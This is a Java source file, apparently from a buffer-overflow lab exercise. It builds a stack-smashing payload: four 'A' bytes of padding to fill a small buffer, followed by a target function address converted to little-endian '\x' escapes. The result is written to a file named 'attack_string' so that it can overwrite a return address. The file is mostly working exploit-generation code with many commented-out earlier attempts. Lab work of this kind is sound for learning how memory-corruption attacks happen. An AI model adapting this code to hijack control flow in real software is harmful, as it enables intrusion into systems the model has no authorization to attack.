import java.io.FileWriter;
import java.io.IOException;

public class AttackBackUp {

//    public static String constructAttackString(String targetAddress) {
//        // Construct the attack string
//        String padding = "A".repeat(4); // Fill the buffer (size 4) to overwrite the return address
//        String targetAddr = targetAddress; // Address of the target function
//        return padding + targetAddr; // Combine padding and target address
//    }

    public static String constructAttackString(String targetAddress) {
        StringBuilder attackString = new StringBuilder();
        attackString.append("A".repeat(4));
        System.out.println("targetAddress: " + targetAddress);
//        String[] pairs = new String[targetAddress.length() / 2];

        for (int i = targetAddress.length() - 2, j = 0; i >= 0; i -= 2, j++) {
            //pairs[j] = "\\x" + targetAddress.substring(i, i + 2);
            attackString.append("\\x" + targetAddress.substring(i, i + 2));
//            attackString.append(targetAddress.substring(i, i + 2));
        }

        // Print the pairs
//        for (int i = 0; i < pairs.length; i++) {
//            System.out.println(pairs[i]);
//        }
        System.out.println("attackString: " + attackString.toString());
        return attackString.toString();
//        System.exit(0);
        // Convert the target address to little-endian format
//        String[] addressBytes = targetAddress.split("(?<=\\G..)");
//        System.out.println("addressBytes: " + addressBytes.toString());
//        StringBuilder attackString = new StringBuilder();
//        for (int i = addressBytes.length - 1; i >= 0; i--) {
//            attackString.append((char) Integer.parseInt(addressBytes[i], 16));
//            System.out.println("aS: " + attackString);
//        }
//        System.out.println("Attack String: " +attackString);

        // Pad the attack string with 'A' characters to overflow the buffer
//        attackString.append("A".repeat(100 - addressBytes.length * 2)); // Each byte is represented by 2 hexadecimal characters
//
//        return attackString.toString();
    }

    public static void main(String[] args) {
        // Check if the correct number of arguments is provided
        if (args.length != 1) {
            System.out.println("Usage: java Attack <target_function_address>");
            System.exit(1);
        }

        // Get the target function address from command line arguments
        String targetAddress = args[0];

        // Construct the attack string
        String attackString = constructAttackString(targetAddress);

        // Write the attack string to the attack string file
        try (FileWriter writer = new FileWriter("attack_string")) {
            writer.write(attackString);
            System.out.println("Attack string has been successfully written to 'attack_string' file.");
        } catch (IOException e) {
            System.err.println("Error writing to file: " + e.getMessage());
            System.exit(1);
        }
    }
}
